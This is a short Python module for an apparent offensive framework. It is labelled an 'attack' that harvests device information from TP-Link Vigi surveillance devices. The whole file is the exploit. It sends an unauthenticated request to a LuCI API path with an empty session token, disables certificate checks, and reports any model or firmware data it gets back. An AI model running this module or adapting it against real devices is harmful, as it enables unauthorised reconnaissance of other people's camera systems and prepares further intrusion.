import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "tplink/vigi_leak_attack"
        self.description = "Exploit engine to harvest structural device information variables from TP-Link Vigi devices."
        self.type = "attack"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        if not target.startswith(("http://", "https://")):
            url = f"http://{target}:{port}/cgi-bin/luci/;stok=/api/v1/system/device_info"
        else:
            url = f"{target.rstrip('/')}/cgi-bin/luci/;stok=/api/v1/system/device_info"
            
        try:
            async with httpx.AsyncClient(timeout=8.0, verify=False) as client:
                print("\033[1;33m[*] Interrogating TP-Link Vigi Luci API parameters handler...\033[0m")
                response = await client.get(url)
                
                if response.status_code == 200 and ("model" in response.text or "firmware" in response.text):
                    return {
                        "success": True,
                        "details": f"TP-Link Vigi system data extracted successfully:\n{response.text.strip()}"
                    }
        except Exception as e:
            return {"success": False, "error": str(e)}
        return {"success": False, "details": "Exploit delivery completed, but target did not leak readable JSON tokens."}
